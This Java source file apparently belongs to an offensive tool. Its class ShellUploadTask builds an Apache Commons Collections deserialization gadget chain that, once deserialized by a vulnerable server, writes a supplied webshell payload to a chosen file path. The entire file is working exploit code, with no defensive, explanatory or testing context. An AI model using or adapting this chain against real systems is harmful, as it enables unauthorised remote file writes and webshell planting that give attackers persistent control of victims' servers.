package seriFileUp.test;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


public class ShellUploadTask
{
  //private final String targetUrl;
  private final byte[] webshellPayload;
  private final String fileUpPath;
  
  public ShellUploadTask(String fileUpPath, byte[] webshellPayload)
  {
    //this.targetUrl = targetUrl;
    this.fileUpPath = fileUpPath;
    this.webshellPayload = webshellPayload;
  }
  
  
  protected Object getUpFilePayload()
		    throws Exception
		  {
		    Transformer[] transformers = {
		      new ConstantTransformer(FileOutputStream.class), 
		      new InvokerTransformer("getConstructor", new Class[] { Class[].class }, 
		      new Object[] { new Class[] { String.class } }), // new Class[]
		      //file path
		      new InvokerTransformer("newInstance", new Class[] { Object[].class }, 
		      new Object[] { new Object[] { this.fileUpPath } }), // new String[] ??
		      //file content
		      new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { this.webshellPayload }) };
		    
		    Transformer transformerChain = new ChainedTransformer(transformers);
		    Map<String, String> innerMap = new HashMap();
		    innerMap.put("value", "value");
		    Map<?, ?> outMap = TransformedMap.decorate(innerMap, null, transformerChain);
		    Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		    Constructor<?> ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
		    ctor.setAccessible(true);
		    Object instance = ctor.newInstance(new Object[] { Retention.class, outMap });
		    
		    /*
		    ByteArrayOutputStream byteArrayOut = new ByteArrayOutputStream(10);
		    ObjectOutputStream objectOut = new ObjectOutputStream(byteArrayOut);
		    objectOut.writeObject(instance);
		    objectOut.flush();
		    objectOut.close();
		    
		    return byteArrayOut.toByteArray();
		    */
		    return instance;
		  }
}
